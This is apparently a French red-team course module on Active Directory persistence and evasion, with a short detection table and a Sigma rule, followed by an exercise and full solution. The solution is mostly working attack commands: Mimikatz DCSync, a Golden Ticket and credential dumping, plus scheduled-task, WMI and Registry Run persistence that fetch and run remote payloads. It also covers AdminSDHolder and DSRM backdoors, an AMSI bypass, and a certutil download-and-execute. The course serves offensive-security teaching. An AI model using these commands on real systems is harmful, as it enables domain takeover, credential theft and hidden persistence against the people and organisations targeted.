Pour la Blue Team, voici les indicateurs de compromission courants :

| Indicateur | Description | Détection |
|------------|-------------|-----------|
| **Beaconing** | Communications régulières | Analyse statistique du trafic |
| **DNS anormal** | TXT records, subdomains longs | Logs DNS, volume inhabituel |
| **Named Pipes** | Pipes avec noms suspects | Sysmon Event ID 17/18 |
| **Process Injection** | CreateRemoteThread | Sysmon Event ID 8 |
| **Parent/Child anormal** | Word → PowerShell | Process tree analysis |

```yaml
# Sigma rule - Sliver default beacon
title: Potential Sliver C2 Beacon Detected
status: experimental
logsource:
    category: proxy
detection:
    selection:
        cs-method: POST
        cs-uri-stem|contains:
            - '/api/v1/'
            - '/oauth/'
            - '/auth/'
        cs-bytes|gte: 1000
    timeframe: 5m
    condition: selection | count() > 10
level: high
```

---

## Exercice Pratique

!!! example "Exercice : Persistence et Évasion"

    **Objectif** : Établir 3 mécanismes de persistence différents et démontrer leur résilience aux redémarrages

    **Contexte** : Vous êtes Domain Admin sur le domaine. Vous devez établir une persistence durable qui survit aux redémarrages et qui échappe aux détections basiques.

    **Phase 1 : Golden Ticket (30 min)**

    1. Extraire le hash krbtgt via DCSync
    2. Créer un Golden Ticket
    3. Tester l'accès après déconnexion/reconnexion

    **Phase 2 : Persistence locale (45 min)**

    1. Créer une tâche planifiée qui exécute un reverse shell
    2. Configurer une WMI Event Subscription
    3. Ajouter une entrée Registry Run

    **Phase 3 : Domain Persistence (45 min)**

    1. Configurer AdminSDHolder pour un utilisateur contrôlé
    2. Activer DSRM
    3. (Optionnel) Skeleton Key

    **Phase 4 : Évasion (30 min)**

    1. Bypasser AMSI
    2. Exécuter Mimikatz malgré Defender
    3. Utiliser un LOLBin pour télécharger un payload

    **Critères de réussite** :

    - [ ] Golden Ticket fonctionnel
    - [ ] Au moins 2 mécanismes de persistence locale
    - [ ] AdminSDHolder configuré
    - [ ] AMSI bypassé avec exécution de script

??? quote "Solution"

    **Phase 1 : Golden Ticket**

    ```powershell
    # 1. DCSync pour krbtgt
    .\mimikatz.exe "privilege::debug" "lsadump::dcsync /user:krbtgt" "exit"

    # Résultat :
    # Hash NTLM : a1b2c3d4e5f6...
    # SID : S-1-5-21-1234567890-...

    # 2. Créer le Golden Ticket
    .\mimikatz.exe
    kerberos::golden /user:FakeAdmin /domain:yourcompany.local /sid:S-1-5-21-1234567890-... /krbtgt:a1b2c3d4e5f6... /ptt

    # 3. Tester
    dir \\dc01\c$
    # Accès OK même sans être vraiment DA!
    ```

    **Phase 2 : Persistence locale**

    ```powershell
    # 1. Tâche planifiée
    schtasks /create /tn "WindowsSecurityUpdate" /tr "powershell -ep bypass -w hidden -c IEX((New-Object Net.WebClient).DownloadString('http://192.168.56.100/shell.ps1'))" /sc onlogon /ru SYSTEM

    # 2. WMI Subscription
    $Filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{
        Name = 'SystemUpdate'
        EventNamespace = 'root\cimv2'
        QueryLanguage = 'WQL'
        Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
    }

    $Consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{
        Name = 'SystemUpdateConsumer'
        CommandLineTemplate = 'powershell -ep bypass -w hidden -c "IEX((New-Object Net.WebClient).DownloadString(''http://192.168.56.100/shell.ps1''))"'
    }

    Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{
        Filter = $Filter
        Consumer = $Consumer
    }

    # 3. Registry Run
    reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v SecurityUpdate /t REG_SZ /d "powershell -ep bypass -w hidden -enc BASE64_PAYLOAD"
    ```

    **Phase 3 : Domain Persistence**

    ```powershell
    # 1. AdminSDHolder
    # Charger PowerView
    Import-Module .\PowerView.ps1

    Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=yourcompany,DC=local' -PrincipalIdentity backdoor_user -Rights All -Verbose

    # Forcer SDProp (sinon attendre 60 min)
    Invoke-SDPropagator -showProgress -timeoutMinutes 1

    # 2. DSRM
    reg add "HKLM\System\CurrentControlSet\Control\Lsa" /v DsrmAdminLogonBehavior /t REG_DWORD /d 2

    # Hash DSRM récupéré lors du DCSync (compte DSRM)
    ```

    **Phase 4 : Évasion**

    ```powershell
    # 1. AMSI Bypass
    [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

    # 2. Exécuter Mimikatz
    # Télécharger une version obfusquée ou utiliser Invoke-Mimikatz
    IEX (New-Object Net.WebClient).DownloadString('http://192.168.56.100/Invoke-Mimikatz.ps1')
    Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::logonpasswords"'

    # 3. LOLBin
    certutil -urlcache -split -f http://192.168.56.100/payload.exe C:\temp\payload.exe
    C:\temp\payload.exe
    ```

---

## Points Clés à Retenir

- **Golden Ticket** : Persistence ultime, valide jusqu'au double changement de krbtgt
- **WMI Subscriptions** : Plus discrètes que les tâches planifiées
- **AdminSDHolder** : Persistence domain-wide en 60 minutes
- **AMSI** : Bypass nécessaire pour tout script offensif
- **LOLBins** : Toujours préférer les binaires légitimes
- **Logs** : Les techniques de persistence laissent des traces

---

## Ressources

- [HackTricks - Windows Persistence](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/persistence)
- [The Hacker Recipes - Persistence](https://www.thehacker.recipes/ad/persistence)
- [LOLBAS Project](https://lolbas-project.github.io/)
- [Mimikatz Wiki](https://github.com/gentilkiwi/mimikatz/wiki)

---

| | |
|:---|---:|
| [← Module 4 : Privilege Escalation](04-module.md) | [Module 6 : Projet Final →](06-tp-final.md) |

[Retour au Programme](index.md){ .md-button }
